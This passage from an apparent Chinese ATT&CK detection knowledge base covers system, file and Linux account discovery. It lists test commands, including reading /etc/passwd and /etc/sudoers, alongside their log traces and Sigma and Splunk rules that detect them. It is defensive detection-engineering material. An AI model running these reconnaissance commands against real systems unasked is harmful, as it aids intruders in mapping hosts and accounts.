Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\Administrator>systeminfo \u4e3b\u673a\u540d: ABCC OS \u540d\u79f0: Microsoft Windows 10 \u4e13\u4e1a\u7248 OS \u7248\u672c: 10.0.18362 \u6682\u7f3a Build 18362 OS \u5236\u9020\u5546: Microsoft Corporation OS \u914d\u7f6e: \u72ec\u7acb\u5de5\u4f5c\u7ad9 OS \u6784\u4ef6\u7c7b\u578b: Multiprocessor Free \u6ce8\u518c\u7684\u6240\u6709\u4eba: Windows User \u6ce8\u518c\u7684\u7ec4\u7ec7: \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7/4688/\u8fdb\u7a0b\u540d\u79f0/\u8fdb\u7a0b\u547d\u4ee4\u884c \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6d4b\u8bd5\u73af\u5883\u4e3awindows server 2012\u9700\u8981\u5f00\u542f\u5ba1\u6838\u7b56\u7565\u624d\u80fd\u591f\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u8fdb\u884c\u5ba1\u8ba1\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u5728windows\u7cfb\u7edf\u4fe1\u606f\u53d1\u73b0 description: windows server 2012 \u6d4b\u8bd5\u7ed3\u679c references: https://github.com/0xpwntester/CB-Threat-Hunting/blob/master/ATT%26CK/T1082-%20systeminfo%20executions.md tags: T1082 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\systeminfo.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Tokenpromotiontype: 'TokenElevationTypeDefault (1)' #\u4ee4\u724c\u63d0\u5347\u7c7b\u578b Processcommandline: 'systeminfo' #\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1082 https://attack.mitre.org/techniques/T1082/","title":"T1082-win-\u7cfb\u7edf\u4fe1\u606f\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#t1082-win-","text":"","title":"T1082-win-\u7cfb\u7edf\u4fe1\u606f\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u83b7\u53d6\u6709\u5173\u64cd\u4f5c\u7cfb\u7edf\u548c\u786c\u4ef6\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u7248\u672c\uff0c\u8865\u4e01\uff0c\u4fee\u8865\u7a0b\u5e8f\uff0c\u670d\u52a1\u5305\u548c\u76ee\u5f55\u7ed3\u6784\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7cfb\u7edf\u4fe1\u606f\u4e2d\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u51b3\u5b9a\u540e\u7eed\u7684\u64cd\u4f5c\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u4e86\u76ee\u6807\u6216\u5c1d\u8bd5\u4e86\u7279\u5b9a\u64cd\u4f5c\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_1","text":"","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#windows","text":"\u83b7\u5f97\u6b64\u4fe1\u606f\u4f8b\u5982\u547d\u4ee4\u548c\u5b9e\u7528\u7a0b\u5e8f\u5305\u62ecver\uff0cSYSTEMINFO\uff0c\u548cdir\u7b49\u7528\u4e8e\u57fa\u4e8e\u672c\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u4fe1\u606f\u3002","title":"windows"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_3","text":"windows\u4e0b\u6d4b\u8bd5systeminfo\u547d\u4ee4 Microsoft Windows [\u7248\u672c 6.3.9600] (c) 2013 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\Administrator>systeminfo \u4e3b\u673a\u540d: ABCC OS \u540d\u79f0: Microsoft Windows 10 \u4e13\u4e1a\u7248 OS \u7248\u672c: 10.0.18362 \u6682\u7f3a Build 18362 OS \u5236\u9020\u5546: Microsoft Corporation OS \u914d\u7f6e: \u72ec\u7acb\u5de5\u4f5c\u7ad9 OS \u6784\u4ef6\u7c7b\u578b: Multiprocessor Free \u6ce8\u518c\u7684\u6240\u6709\u4eba: Windows User \u6ce8\u518c\u7684\u7ec4\u7ec7:","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_4","text":"windows \u5b89\u5168\u65e5\u5fd7/4688/\u8fdb\u7a0b\u540d\u79f0/\u8fdb\u7a0b\u547d\u4ee4\u884c \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6d4b\u8bd5\u73af\u5883\u4e3awindows server 2012\u9700\u8981\u5f00\u542f\u5ba1\u6838\u7b56\u7565\u624d\u80fd\u591f\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u8fdb\u884c\u5ba1\u8ba1\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#sigma","text":"title: \u5728windows\u7cfb\u7edf\u4fe1\u606f\u53d1\u73b0 description: windows server 2012 \u6d4b\u8bd5\u7ed3\u679c references: https://github.com/0xpwntester/CB-Threat-Hunting/blob/master/ATT%26CK/T1082-%20systeminfo%20executions.md tags: T1082 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\systeminfo.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Tokenpromotiontype: 'TokenElevationTypeDefault (1)' #\u4ee4\u724c\u63d0\u5347\u7c7b\u578b Processcommandline: 'systeminfo' #\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1082 https://attack.mitre.org/techniques/T1082/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/","text":"T1083-win-\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u679a\u4e3e\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e3b\u673a\u6216\u7f51\u7edc\u5171\u4eab\u7684\u7279\u5b9a\u4f4d\u7f6e\u641c\u7d22\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u67d0\u4e9b\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u671f\u95f4\u4f7f\u7528\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0\u4e2d\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u548c/\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002 \u6d4b\u8bd5\u6848\u4f8b windows \u7528\u4e8e\u83b7\u53d6\u6b64\u4fe1\u606f\u7684\u793a\u4f8b\u5b9e\u7528\u7a0b\u5e8f\u6709dir\u548ctree\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u5de5\u5177\u6536\u96c6\u6587\u4ef6\u548c\u76ee\u5f55\u4fe1\u606f\uff0c\u5e76\u4e0eWindows API\u4ea4\u4e92\u3002 Mac\u548cLinux \u5728Mac\u548cLinux\u4e2d\uff0c\u8fd9\u79cd\u53d1\u73b0\u662f\u901a\u8fc7ls\u3001find\u548clocate\u547d\u4ee4\u5b8c\u6210\u7684\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u8fd9\u91cc\u4e3b\u8981\u6f14\u793awindows\u4e3b\u673a\u4e0b\u6267\u884cdir\u547d\u4ee4\u4ee5\u53catree\u547d\u4ee4\u3002 \u6d4b\u8bd5\u7559\u75d5 \u6a21\u62df\u6d4b\u8bd5\uff1awindows server 2016 \u4e0b\u5bf9dir\u547d\u4ee4\u4e0d\u505a\u8bb0\u5f55 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u5728windows\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0 description: windows server 2016 tags: T1083 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\windows\\system32\\tree.com' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: tree #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1083 https://attack.mitre.org/techniques/T1083/","title":"T1083-win-\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#t1083-win-","text":"","title":"T1083-win-\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u679a\u4e3e\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e3b\u673a\u6216\u7f51\u7edc\u5171\u4eab\u7684\u7279\u5b9a\u4f4d\u7f6e\u641c\u7d22\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u67d0\u4e9b\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u671f\u95f4\u4f7f\u7528\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0\u4e2d\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u548c/\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_1","text":"windows \u7528\u4e8e\u83b7\u53d6\u6b64\u4fe1\u606f\u7684\u793a\u4f8b\u5b9e\u7528\u7a0b\u5e8f\u6709dir\u548ctree\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u5de5\u5177\u6536\u96c6\u6587\u4ef6\u548c\u76ee\u5f55\u4fe1\u606f\uff0c\u5e76\u4e0eWindows API\u4ea4\u4e92\u3002 Mac\u548cLinux \u5728Mac\u548cLinux\u4e2d\uff0c\u8fd9\u79cd\u53d1\u73b0\u662f\u901a\u8fc7ls\u3001find\u548clocate\u547d\u4ee4\u5b8c\u6210\u7684\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_3","text":"\u8fd9\u91cc\u4e3b\u8981\u6f14\u793awindows\u4e3b\u673a\u4e0b\u6267\u884cdir\u547d\u4ee4\u4ee5\u53catree\u547d\u4ee4\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_4","text":"\u6a21\u62df\u6d4b\u8bd5\uff1awindows server 2016 \u4e0b\u5bf9dir\u547d\u4ee4\u4e0d\u505a\u8bb0\u5f55","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#sigma","text":"title: \u5728windows\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0 description: windows server 2016 tags: T1083 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\windows\\system32\\tree.com' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: tree #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1083 https://attack.mitre.org/techniques/T1083/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/","text":"T1087-001-linux-\u672c\u5730\u8d26\u6237\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u672c\u5730\u7cfb\u7edf\u5e10\u6237\u7684\u5217\u8868\u3002\u6b64\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u786e\u5b9a\u7cfb\u7edf\u4e0a\u5b58\u5728\u54ea\u4e9b\u672c\u5730\u5e10\u6237\uff0c\u4ee5\u5e2e\u52a9\u540e\u7eed\u884c\u4e3a\u3002 \u547d\u4ee4\u5982net user\u548cnet localgroup\u7684\u7684\u51c0\u6548\u7528\u548cid\u548cgroups\u5728Mac OS\u548cLinux\u53ef\u4ee5\u5217\u51fa\u672c\u5730\u7528\u6237\u548c\u7ec4\u3002\u5728Linux\u4e0a\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528/etc/passwd\u6587\u4ef6\u6765\u679a\u4e3e\u672c\u5730\u7528\u6237\u3002 \u5728Linux\u4e0a\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528/etc/passwd\u4e16\u754c\u53ef\u8bfb\u7684\u6587\u4ef6\u6765\u679a\u4e3e\u672c\u5730\u7528\u6237\u3002\u5728mac\u4e2d\uff0c\u9664\u6587\u4ef6\u5916\uff0c\u6b64\u76f8\u540c\u6587\u4ef6\u4ec5\u7528\u4e8e\u5355\u7528\u6237\u6a21\u5f0f/etc/master.passwd\u3002\u6b64\u5916\uff0c\u53ef\u4ee5\u901a\u8fc7groups\u548cid\u547d\u4ee4\u679a\u4e3e\u7ec4\u3002 \u6d4b\u8bd5\u6848\u4f8b \u679a\u4e3e\u6240\u6709\u8d26\u6237\uff1acat /etc/passwd \u67e5\u770bsudoers\u6587\u4ef6\uff1acat /etc/sudoers \u67e5\u770bUID\u4e3a0\u7684\u5e10\u6237\uff1ausername=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username \u663e\u793a\u7528\u6237\u5e10\u6237\u662f\u5426\u6709\u8fdc\u7a0b\u8bb0\u5f55\u5668\uff1alastlog \u679a\u4e3e\u7528\u6237\u548c\u7ec4\uff1agroups \u6216\u8005 id \u68c0\u6d4b\u65e5\u5fd7 bash\u5386\u53f2\u8bb0\u5f55 \u6d4b\u8bd5\u590d\u73b0 \u679a\u4e3e\u6240\u6709\u8d26\u6237\uff1acat /etc/passwd \u67e5\u770bsudoers\u6587\u4ef6\uff1acat /etc/sudoers \uff08\u9700\u8981root\u6743\u9650\uff09 \u67e5\u770bUID\u4e3a0\u7684\u5e10\u6237\uff1ausername=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username \u663e\u793a\u7528\u6237\u5e10\u6237\u662f\u5426\u6709\u8fdc\u7a0b\u8bb0\u5f55\u5668\uff1alastlog \u679a\u4e3e\u7528\u6237\u548c\u7ec4\uff1agroups\uff08\u9700\u8981root\u6743\u9650\uff09 \u6216\u8005 id \u6d4b\u8bd5\u7559\u75d5 root@icbc:~/Desktop$ history 385 cat /etc/passwd 386 cat /etc/sudoers 387 username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username 388 lastlog 389 groups 390 id 391 history \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 index=linux sourcetype=bash_history cat /etc/passwd | table host,user_name,bash_command index=linux sourcetype=bash_history cat /etc/sudoers | table host,user_name,bash_command index=linux sourcetype=bash_history \"lsof -u *\" | table host,user_name,bash_command index=linux sourcetype=bash_history lastlog | table host,user_name,bash_command index=linux sourcetype=bash_history group OR id | table host,user_name,bash_command \u5efa\u8bae \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u5e94\u8be5\u7ed3\u5408\u4e0a\u4e0b\u6587\u4e2d\u67e5\u770b\u7814\u5224\uff0c\u800c\u4e0d\u662f\u5355\u72ec\u4f9d\u9760\u5173\u952e\u8bcd\u68c0\u6d4b\uff0c\u56e0\u4e3a\u7cfb\u7edf\u7ba1\u7406\u5458\u7ecf\u5e38\u4f7f\u7528\u8fd9\u4e9b\u547d\u4ee4\u8fdb\u884c\u5408\u6cd5\u64cd\u4f5c\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1087-001 https://attack.mitre.org/techniques/T1087/001 linux UID\u8be6\u89e3 https://blog.csdn.net/jthivan/article/details/50530955 linux ID\u67e5\u770b\u547d\u4ee4\u8be6\u89e3 https://blog.csdn.net/qq_21808961/article/details/78532487","title":"T1087-001-linux-\u672c\u5730\u8d26\u6237\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#t1087-001-linux-","text":"","title":"T1087-001-linux-\u672c\u5730\u8d26\u6237\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u672c\u5730\u7cfb\u7edf\u5e10\u6237\u7684\u5217\u8868\u3002\u6b64\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u786e\u5b9a\u7cfb\u7edf\u4e0a\u5b58\u5728\u54ea\u4e9b\u672c\u5730\u5e10\u6237\uff0c\u4ee5\u5e2e\u52a9\u540e\u7eed\u884c\u4e3a\u3002 \u547d\u4ee4\u5982net user\u548cnet localgroup\u7684\u7684\u51c0\u6548\u7528\u548cid\u548cgroups\u5728Mac OS\u548cLinux\u53ef\u4ee5\u5217\u51fa\u672c\u5730\u7528\u6237\u548c\u7ec4\u3002\u5728Linux\u4e0a\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528/etc/passwd\u6587\u4ef6\u6765\u679a\u4e3e\u672c\u5730\u7528\u6237\u3002 \u5728Linux\u4e0a\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528/etc/passwd\u4e16\u754c\u53ef\u8bfb\u7684\u6587\u4ef6\u6765\u679a\u4e3e\u672c\u5730\u7528\u6237\u3002\u5728mac\u4e2d\uff0c\u9664\u6587\u4ef6\u5916\uff0c\u6b64\u76f8\u540c\u6587\u4ef6\u4ec5\u7528\u4e8e\u5355\u7528\u6237\u6a21\u5f0f/etc/master.passwd\u3002\u6b64\u5916\uff0c\u53ef\u4ee5\u901a\u8fc7groups\u548cid\u547d\u4ee4\u679a\u4e3e\u7ec4\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_1","text":"\u679a\u4e3e\u6240\u6709\u8d26\u6237\uff1acat /etc/passwd \u67e5\u770bsudoers\u6587\u4ef6\uff1acat /etc/sudoers \u67e5\u770bUID\u4e3a0\u7684\u5e10\u6237\uff1ausername=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username \u663e\u793a\u7528\u6237\u5e10\u6237\u662f\u5426\u6709\u8fdc\u7a0b\u8bb0\u5f55\u5668\uff1alastlog \u679a\u4e3e\u7528\u6237\u548c\u7ec4\uff1agroups \u6216\u8005 id","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_2","text":"bash\u5386\u53f2\u8bb0\u5f55","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_3","text":"\u679a\u4e3e\u6240\u6709\u8d26\u6237\uff1acat /etc/passwd \u67e5\u770bsudoers\u6587\u4ef6\uff1acat /etc/sudoers \uff08\u9700\u8981root\u6743\u9650\uff09 \u67e5\u770bUID\u4e3a0\u7684\u5e10\u6237\uff1ausername=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username \u663e\u793a\u7528\u6237\u5e10\u6237\u662f\u5426\u6709\u8fdc\u7a0b\u8bb0\u5f55\u5668\uff1alastlog \u679a\u4e3e\u7528\u6237\u548c\u7ec4\uff1agroups\uff08\u9700\u8981root\u6743\u9650\uff09 \u6216\u8005 id","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_4","text":"root@icbc:~/Desktop$ history 385 cat /etc/passwd 386 cat /etc/sudoers 387 username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username 388 lastlog 389 groups 390 id 391 history","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#splunk","text":"index=linux sourcetype=bash_history cat /etc/passwd | table host,user_name,bash_command index=linux sourcetype=bash_history cat /etc/sudoers | table host,user_name,bash_command index=linux sourcetype=bash_history \"lsof -u *\" | table host,user_name,bash_command index=linux sourcetype=bash_history lastlog | table host,user_name,bash_command index=linux sourcetype=bash_history group OR id | table host,user_name,bash_command","title":"splunk\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_6","text":"\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u5e94\u8be5\u7ed3\u5408\u4e0a\u4e0b\u6587\u4e2d\u67e5\u770b\u7814\u5224\uff0c\u800c\u4e0d\u662f\u5355\u72ec\u4f9d\u9760\u5173\u952e\u8bcd\u68c0\u6d4b\uff0c\u56e0\u4e3a\u7cfb\u7edf\u7ba1\u7406\u5458\u7ecf\u5e38\u4f7f\u7528\u8fd9\u4e9b\u547d\u4ee4\u8fdb\u884c\u5408\u6cd5\u64cd\u4f5c\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1087-001 https://attack.mitre.org/techniques/T1087/001 linux UID\u8be6\u89e3 https://blog.csdn.net/jthivan/article/details/50530955 linux ID\u67e5\u770b\u547d\u4ee4\u8be6\u89e3 https://blog.csdn.net/qq_21808961/article/details/78532487","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/","text":"T1114-001-win-\u672c\u5730\u7535\u5b50\u90ae\u4ef6\u6536\u96c6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u7528\u6237\u672c\u5730\u7cfb\u7edf\u4e0a\u6536\u96c6\u7535\u5b50\u90ae\u7bb1\u4fe1\u606f\uff0c\u7528\u4ee5\u6536\u96c6\u654f\u611f\u4fe1\u606f\u3002\u53ef\u4ee5\u4ece\u7528\u6237\u7684\u672c\u5730\u7cfb\u7edf\u4e2d\u83b7\u53d6\u5305\u542b\u7535\u5b50\u90ae\u4ef6\u6570\u636e\u7684\u6587\u4ef6\uff0c\u4f8b\u5982Outlook\u5b58\u50a8\u6216\u7f13\u5b58\u6587\u4ef6\u3002 